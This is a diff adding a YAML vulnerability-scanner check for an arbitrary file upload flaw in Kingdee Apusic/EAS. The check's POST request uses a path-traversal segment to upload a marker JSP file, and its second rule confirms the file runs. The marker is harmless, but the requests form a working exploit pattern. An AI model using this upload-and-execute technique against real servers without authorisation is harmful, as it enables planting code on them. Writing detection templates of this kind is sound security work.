@@ -1,0 +1,19 @@
+name: 金蝶-Apusic-金蝶EAS-myUploadFile-任意文件上传
+description: >-
+  任意文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /easportal/buffalo/%2e%2e/cm/myUploadFile.do
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
+    body: "------WebKitFormBoundarySq4lDnabv8CwHfvx\r\nContent-Disposition: form-data; name=\"myFile\"; filename=\"Rscan.jsp\"\r\nContent-Type: text/html\r\n\r\n<%out.println(\"Rscan_test\");%>\r\n------WebKitFormBoundarySq4lDnabv8CwHfvx--"
+    expression:
+      status: 200
+  - method: GET
+    path: /easportal/buffalo/%2e%2e/Rscan.jsp
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test"
